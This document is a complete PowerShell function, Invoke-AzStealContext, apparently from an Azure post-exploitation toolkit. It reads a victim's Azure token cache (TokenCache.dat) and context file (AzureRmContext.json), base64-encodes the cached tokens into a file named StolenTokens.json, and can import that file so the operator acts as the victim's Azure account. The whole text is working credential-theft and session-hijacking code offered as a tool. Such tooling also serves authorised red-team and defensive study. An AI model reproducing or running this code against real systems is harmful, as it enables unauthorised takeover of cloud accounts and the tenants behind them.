Function Invoke-AzStealContext {
    [cmdletbinding()]
    Param (
        [String]$Path,
        [String]$OutFile = 'StolenTokens.json',
        [switch]$ImportContext,
        [Switch]$Force
    )
    begin {
        Try {
            If (!(Test-Path $(Join-Path $Path "TokenCache.dat"))) {
                Write-Error "Unable to find TokenCache.dat file in folder $path" -ErrorAction Stop
            }
            If (!(Test-Path $(Join-Path $Path "AzureRmContext.json"))) {
                Write-Error "Unable to find AzureRmContext.json file in folder $path" -ErrorAction Stop
            }
            If (!($force)) {
                If (Test-Path $(Join-Path $Path $OutFile)) {
                    Write-Error "$(Join-Path $Path $OutFile) already exists" -ErrorAction Stop
                }
            }
            If ($ImportContext) {
                If ($null -eq $(Get-Module -ListAvailable -Name Az.Accounts)) {
                    Write-Error "Az module is not installed on the system. Run `'Install-Module Az'`." -ErrorAction Stop
                }
                Else {
                    Import-Module Az
                }
            }
        }
        Catch {
            $PSCmdlet.ThrowTerminatingError($PSItem)
        }     
    }
    Process {
        Try {
            $bytes = Get-Content $(Join-Path $Path "TokenCache.dat") -Encoding byte
            $b64 = [Convert]::ToBase64String($bytes)
            $AzureRmContext = Get-Content $(Join-Path $Path "AzureRmContext.json") | ConvertFrom-Json
            If (($AzureRmContext.contexts.PSObject.Properties.Name).count -gt 1) {
                $Contexts = $AzureRmContext.contexts.PSObject.Properties.Name
                Write-host "Detected multiple contexts."
                do { 
                    Write-Host $Message
                    $index = 1
                    foreach ($Context in $Contexts) {
                        Write-Host "[$index] $($Context)"
                        $index++
                    }   
                    $selection = Read-Host "Select the context to use as default."
                } until ($Contexts[[int]$selection-1])
                $DefaultContext = $Contexts[$selection-1]
            }
            ForEach ($context in $AzureRmContext.contexts.PSObject.Properties.Name) {
                $AzureRmContext.DefaultContextKey = $DefaultContext
                $AzureRmContext.Contexts.$($context).TokenCache.CacheData = $b64
            }
            $AzureRmContext | ConvertTo-Json -Depth 100 | Set-Content $(Join-Path $Path $OutFile)
        } Catch {
            $PSCmdlet.ThrowTerminatingError($PSItem)
        }
    }
    End {
        If ($ImportContext) {
            [void](Import-AzContext -Profile $(Join-Path $Path "StolenTokens.json"))
            Write-Host "Imported stolen context."
            $((Get-AzContext).Account | Format-Table -AutoSize ID, Type, ExtendedProperties)
        }
        Else {
            Write-Host "Created stolen context file. run `'Import-AzContext -Profile $(Join-Path $Path $OutFile)`' to import the context."
        }
    }
}
